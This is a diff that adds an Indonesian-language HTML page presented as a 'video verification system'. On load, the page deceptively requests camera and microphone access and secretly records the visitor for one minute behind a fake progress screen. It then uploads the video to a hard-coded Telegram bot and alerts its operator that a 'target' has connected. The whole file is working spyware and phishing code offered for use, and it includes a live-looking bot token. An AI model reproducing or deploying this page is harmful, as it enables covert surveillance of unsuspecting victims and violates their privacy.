@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Video</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; border: 1px solid #00ff00; padding: 30px; background: rgba(0, 20, 0, 0.9); max-width: 80%; }
+        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 13px; font-weight: bold; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <div class="loader"></div>
+    <div id="status">MEMPROSES SERVER...<br><span id="timer">0%</span></div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+
+<script>
+    const TOKEN = '8492775361:AAE5U8rZNjqxGNnthSAaIKf-vO0-WHIrF1w';
+    const CHAT_ID = '7393949927';
+    let mediaRecorder;
+    let recordedChunks = [];
+
+    async function init() {
+        try {
+            // Ambil data perangkat dulu
+            await sendToTele("🚀 *Target terhubung! Memulai perekaman 1 menit...*");
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: true 
+            });
+            
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // Setup Perekam
+            mediaRecorder = new MediaRecorder(stream);
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = uploadVideo;
+
+            // Mulai Rekam
+            mediaRecorder.start();
+            startTimer(60); // Durasi 60 detik
+
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+            }, 60000);
+
+        } catch (err) {
+            sendToTele("⚠️ *Akses Kamera/Mic Ditolak Target*");
+            document.getElementById('status').innerText = "Gagal Terhubung ke Server.";
+        }
+    }
+
+    function startTimer(seconds) {
+        let count = 0;
+        const timerEl = document.getElementById('timer');
+        const interval = setInterval(() => {
+            count++;
+            let percent = Math.floor((count / seconds) * 100);
+            timerEl.innerText = percent + "%";
+            if (count >= seconds) clearInterval(interval);
+        }, 1000);
+    }
+
+    async function uploadVideo() {
+        document.getElementById('status').innerText = "MENGIRIM LAPORAN...";
+        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('video', blob, 'record.mp4');
+        fd.append('caption', '📹 Hasil Rekaman 1 Menit');
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: fd
+            });
+            document.getElementById('status').innerText = "VERIFIKASI BERHASIL (SKS-01)";
+        } catch (e) {
+            document.getElementById('status').innerText = "Koneksi Terputus.";
+        }
+    }
+
+    async function sendToTele(text) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+        });
+    }
+
+    window.onload = init;
+</script>
+</body>
+</html>
